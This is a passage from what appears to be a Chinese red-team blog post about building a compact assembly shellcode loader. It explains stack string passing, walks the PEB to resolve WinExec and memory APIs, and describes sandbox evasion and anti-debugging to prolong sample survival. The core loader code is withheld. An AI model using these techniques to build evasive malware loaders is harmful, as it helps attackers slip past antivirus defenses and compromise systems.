+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-32-16.png alt></p></p><h2 id=0x03-汇编传递字符串的方式>0x03 汇编传递字符串的方式</h2><p>在写Shellcode或者汇编程序的过程中，难免需要将大量的字符串当作参数传递给函数。不能以高级语言的认知去理解汇编语言传递参数，这里涉及到堆栈平衡、字符串在内存中的形态、计算机存储模式（大端、小端）、函数参数入栈方式等，由于本文篇幅与重点有限，不展开讲解了。</p><p>从字符串入栈开始进行调试：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-32-34.png alt></p></p><p>这一段是调用GetProcAddress这个API，它有两个参数：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>FARPROC <span style=color:#a6e22e>GetProcAddress</span>(
+</span></span><span style=display:flex><span>  [in] HMODULE hModule,
+</span></span><span style=display:flex><span>  [in] LPCSTR  lpProcName
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>Windows操作系统的API传递参数都是从右向左传递，因此第一个参数就是要获取的函数地址的函数名，这个参数是一个字符串。字符串是一个不固定长度的一段连续的值，所以函数接收的参数类型大部分是一个字符串指针，这个指针指向了字符串的开始位置，函数在读取字符串的适合遇到0x00作为字符串的结尾。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>007</span>D1017     <span style=color:#f92672>|</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>78656300</span>           <span style=color:#f92672>|</span> PUSH <span style=color:#ae81ff>0x636578</span>                                  <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>007</span>D101C     <span style=color:#f92672>|</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>57696E45</span>           <span style=color:#f92672>|</span> PUSH <span style=color:#ae81ff>0x456E6957</span>                                <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>007</span>D1021     <span style=color:#f92672>|</span> <span style=color:#ae81ff>54</span>                    <span style=color:#f92672>|</span> PUSH ESP                                       <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>007</span>D1022     <span style=color:#f92672>|</span> FF75 FC               <span style=color:#f92672>|</span> PUSH DWORD PTR SS:[EBP <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x4</span>]                  <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>007</span>D1025     <span style=color:#f92672>|</span> FF55 F8               <span style=color:#f92672>|</span> CALL DWORD PTR SS:[EBP <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>]                  <span style=color:#f92672>|</span>
+</span></span></code></pre></div><p>当栈中压入两个值后，代表了字符串本身已经入栈，再次将指向这个字符串起始位置的内存地址压入栈来完成传入第一个参数的操作，这时刚好ESP栈顶指向的就是字符串的起始位置，所以PUSH ESP就是传递的字符串指针。大部分Shellcode中的字符串传递方式都是如此。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-32-51.png alt></p></p><h2 id=0x04-shellcode加载器实现>0x04 Shellcode加载器实现</h2><p>思路其实与C语言实现的过程并无任何差异，只不过是用更加灵活的汇编语言完成，汇编语言生成的目标文件经过链接后的体积非常小，使得杀毒软件定位特征变得棘手。</p><p>这个项目的开端是用编写Shellcode的视角去做的，可以生成加载器版本的Shellcode去替换到各类软件中，字节码就是它的灵魂。上一个案例中的程序编译完毕的体积仅仅只有1.5KB，由于对齐的因素实际占用空间4KB。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-33-08.png alt></p></p><p>思路：寻找PEB →定位Kernel32.DLL的PE基址→定位GetProcAddress API的地址，获取GetFileSize、CreateFileA、ReadFile、CreateFileMappingA、MapViewOfFileA、VirtualAlloc、VirtualProtect这类常用的API地址对Shellcode进行读取，放入可执行的内存，最终call一下执行。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>global StartMain
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>segment .text USE32
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>StartMain:
+</span></span><span style=display:flex><span>	; <span style=color:#960050;background-color:#1e0010>这里就不公开了</span>
+</span></span><span style=display:flex><span>  ; <span style=color:#960050;background-color:#1e0010>这里就不公开了</span>
+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-33-21.png alt></p></p><p>生成的样本只有2KB，能够完成Shellcode的执行，我还增加了一系列的反调试功能，预防一些自动分析沙箱，延长样本存活时间。</p></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
+to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
+<script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
